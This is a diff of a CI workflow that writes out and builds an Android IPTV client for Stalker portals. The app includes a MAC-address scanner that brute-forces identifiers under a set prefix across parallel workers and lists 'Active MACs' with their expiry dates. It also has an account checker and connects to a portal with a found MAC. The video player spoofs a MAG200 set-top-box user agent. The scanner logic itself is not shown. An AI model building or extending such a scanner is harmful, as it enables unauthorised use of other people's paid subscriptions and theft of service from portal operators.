+              var prefix by remember { mutableStateOf("00:1A:79") }
+              var count by remember { mutableStateOf("50") }
+              var status by remember { mutableStateOf("idle") }
+              var error by remember { mutableStateOf<String?>(null) }
+              var loading by remember { mutableStateOf(false) }
+              var tab by remember { mutableStateOf(0) }
+              var search by remember { mutableStateOf("") }
+              var session by remember { mutableStateOf<Session?>(null) }
+              var items by remember { mutableStateOf(listOf<MediaItem>()) }
+              var hits by remember { mutableStateOf(listOf<Hit>()) }
+
+              fun load() {
+                  val s = session ?: return
+                  scope.launch {
+                      loading = true; error = null
+                      try {
+                          items = withContext(Dispatchers.IO) {
+                              when (tab) {
+                                  0 -> repo.live(s); 1 -> repo.vod(s)
+                                  else -> repo.series(s) }
+                          }
+                          status = "${items.size} items"
+                      } catch (e: Exception) { error = e.message }
+                      finally { loading = false }
+                  }
+              }
+
+              fun connect() {
+                  scope.launch {
+                      loading = true; error = null; status = "connecting..."
+                      try {
+                          val s = withContext(Dispatchers.IO) {
+                              repo.connect(portal, mac) }
+                          val exp = withContext(Dispatchers.IO) { repo.expiry(s) }
+                          session = s
+                          status = "MAC: ${s.mac} - expiry: $exp"
+                          tab = 0
+                          items = withContext(Dispatchers.IO) { repo.live(s) }
+                      } catch (e: Exception) { error = e.message }
+                      finally { loading = false }
+                  }
+              }
+
+              fun scan() {
+                  scope.launch {
+                      loading = true; hits = emptyList(); error = null
+                      status = "scanning..."
+                      withContext(Dispatchers.IO) {
+                          MacScanner.scan(repo, portal, prefix,
+                              count.toIntOrNull() ?: 50, 8,
+                              onHit = { h -> scope.launch { hits = hits + h } },
+                              onDone = { n -> scope.launch {
+                                  status = "scan done: $n hits"; loading = false } })
+                      }
+                  }
+              }
+
+              fun play(item: MediaItem) {
+                  val s = session ?: return
+                  scope.launch {
+                      loading = true; error = null
+                      status = "resolving ${item.name}..."
+                      try {
+                          val url = withContext(Dispatchers.IO) {
+                              repo.stream(s, item) }
+                          if (url.isBlank())
+                              throw IllegalStateException("create_link refused")
+                          ctx.startActivity(Intent(ctx, PlayerActivity::class.java)
+                              .apply { putExtra("url", url)
+                                       putExtra("title", item.name) })
+                          status = "playing ${item.name}"
+                      } catch (e: Exception) { error = e.message }
+                      finally { loading = false }
+                  }
+              }
+
+              Column(Modifier.fillMaxSize().padding(14.dp),
+                  verticalArrangement = Arrangement.spacedBy(10.dp)) {
+                  Text("STB Player Pro", style = MaterialTheme.typography
+                      .headlineSmall, color = Accent)
+                  Text(status, color = Color(0xFF8A8F98),
+                      style = MaterialTheme.typography.bodySmall)
+                  error?.let { Text(it, color = MaterialTheme.colorScheme.error) }
+
+                  OutlinedTextField(portal, { portal = it },
+                      label = { Text("Portal URL") },
+                      modifier = Modifier.fillMaxWidth(), singleLine = true)
+                  Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                      OutlinedTextField(mac, { mac = it }, label = { Text("MAC") },
+                          modifier = Modifier.weight(1f), singleLine = true)
+                      Button({ connect() }, enabled = !loading,
+                          modifier = Modifier.height(56.dp)) { Text("Connect") }
+                      Button({ ctx.startActivity(Intent(ctx,
+                          AccountCheckerActivity::class.java)) },
+                          modifier = Modifier.height(56.dp)) { Text("Check") }
+                  }
+                  Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                      OutlinedTextField(prefix, { prefix = it },
+                          label = { Text("Prefix") },
+                          modifier = Modifier.weight(1f), singleLine = true)
+                      OutlinedTextField(count, { count = it },
+                          label = { Text("Count") },
+                          modifier = Modifier.weight(1f), singleLine = true)
+                      Button({ scan() }, enabled = !loading,
+                          modifier = Modifier.height(56.dp)) { Text("Scan") }
+                  }
+
+                  if (hits.isNotEmpty()) {
+                      Text("Active MACs (tap = load):", color = Accent,
+                          style = MaterialTheme.typography.labelMedium)
+                      LazyColumn(Modifier.height(120.dp)) {
+                          items(hits) { h ->
+                              Text("${h.mac}  (${h.expiry})", color = Color.White,
+                                  modifier = Modifier.fillMaxWidth()
+                                      .clickable { mac = h.mac; connect() }
+                                      .padding(vertical = 6.dp))
+                          }
+                      }
+                  }
+
+                  Row(Modifier.fillMaxWidth(),
+                      horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                      listOf("Live", "VOD", "Series").forEachIndexed { i, label ->
+                          FilterChip(selected = tab == i,
+                              onClick = { tab = i; load() },
+                              label = { Text(label) },
+                              modifier = Modifier.weight(1f))
+                      }
+                  }
+                  OutlinedTextField(search, { search = it },
+                      label = { Text("Search") },
+                      modifier = Modifier.fillMaxWidth(), singleLine = true)
+
+                  LazyColumn(verticalArrangement = Arrangement.spacedBy(6.dp)) {
+                      items(items.filter { it.name.contains(search, true) }) { item ->
+                          Card(Modifier.fillMaxWidth()
+                              .clickable { play(item) }) {
+                              Text(item.name, Modifier.padding(14.dp),
+                                  color = Color.White)
+                          }
+                      }
+                  }
+              }
+          }
+          XEOF
+
+          cat > app/src/main/java/com/stb/iptv/PlayerActivity.kt <<'XEOF'
+          package com.stb.iptv
+
+          import android.os.Bundle
+          import androidx.activity.ComponentActivity
+          import androidx.activity.compose.setContent
+          import androidx.compose.foundation.background
+          import androidx.compose.foundation.layout.Box
+          import androidx.compose.foundation.layout.fillMaxSize
+          import androidx.compose.foundation.layout.padding
+          import androidx.compose.material3.MaterialTheme
+          import androidx.compose.material3.Text
+          import androidx.compose.material3.darkColorScheme
+          import androidx.compose.runtime.*
+          import androidx.compose.ui.Alignment
+          import androidx.compose.ui.Modifier
+          import androidx.compose.ui.graphics.Color
+          import androidx.compose.ui.unit.dp
+          import androidx.compose.ui.viewinterop.AndroidView
+          import androidx.media3.common.MediaItem
+          import androidx.media3.common.MediaMetadata
+          import androidx.media3.common.PlaybackException
+          import androidx.media3.common.Player
+          import androidx.media3.datasource.okhttp.OkHttpDataSource
+          import androidx.media3.exoplayer.ExoPlayer
+          import androidx.media3.exoplayer.source.DefaultMediaSourceFactory
+          import androidx.media3.ui.PlayerView
+
+          class PlayerActivity : ComponentActivity() {
+              private var player: ExoPlayer? = null
+
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  val url = intent.getStringExtra("url") ?: ""
+                  val title = intent.getStringExtra("title") ?: "Stream"
+                  setContent {
+                      MaterialTheme(colorScheme = darkColorScheme()) {
+                          PlayerScreen(url, title)
+                      }
+                  }
+              }
+
+              @Composable
+              private fun PlayerScreen(url: String, title: String) {
+                  var errorMsg by remember { mutableStateOf<String?>(null) }
+                  Box(Modifier.fillMaxSize().background(Color.Black)) {
+                      AndroidView(modifier = Modifier.fillMaxSize(), factory = { c ->
+                          PlayerView(c).apply {
+                              useController = true
+                              val ds = OkHttpDataSource.Factory(
+                                  okhttp3.OkHttpClient())
+                                  .setUserAgent("Mozilla/5.0 (QtEmbedded; U; " +
+                                      "Linux; C) AppleWebKit/533.3 (KHTML, like " +
+                                      "Gecko) MAG200 stbapp ver: 2 rev: 250 " +
+                                      "Safari/533.3")
+                              val exo = ExoPlayer.Builder(c)
+                                  .setMediaSourceFactory(DefaultMediaSourceFactory(ds))
+                                  .setSeekBackIncrementMs(10000)
+                                  .setSeekForwardIncrementMs(10000)
+                                  .build()
+                              player = exo
+                              exo.setMediaItem(MediaItem.Builder()
+                                  .setUri(url)
+                                  .setMediaMetadata(MediaMetadata.Builder()
+                                      .setTitle(title).build())
+                                  .build())
+                              exo.addListener(object : Player.Listener {
+                                  override fun onPlayerError(e: PlaybackException) {
+                                      errorMsg = e.errorCodeName + ": " +
+                                          (e.message ?: "unknown")
+                                  }
+                              })
+                              exo.prepare()
+                              exo.playWhenReady = true
+                          }
+                      })
+                      Text(title, color = Color.White, modifier = Modifier
+                          .align(Alignment.TopStart).padding(12.dp))
+                      errorMsg?.let {
+                          Text(it, color = Color.Red, modifier = Modifier
+                              .align(Alignment.Center).padding(16.dp))
+                      }
+                      DisposableEffect(Unit) {
+                          onDispose { player?.release(); player = null }
+                      }
+                  }
+              }
+
+              override fun onStop() { super.onStop(); player?.pause() }
+              override fun onDestroy() {
+                  player?.release(); player = null; super.onDestroy()
+              }
+          }
+          XEOF
+
+          echo "project generated with account checker"
+
+      - name: Build debug APK
+        run: gradle --no-daemon assembleDebug
+
+      - uses: actions/upload-artifact@v4
         with:
-          name: StalkerIPTV-Mobile-debug
+          name: stalker-iptv-apk
           path: app/build/outputs/apk/debug/app-debug.apk
-          if-no-files-found: error
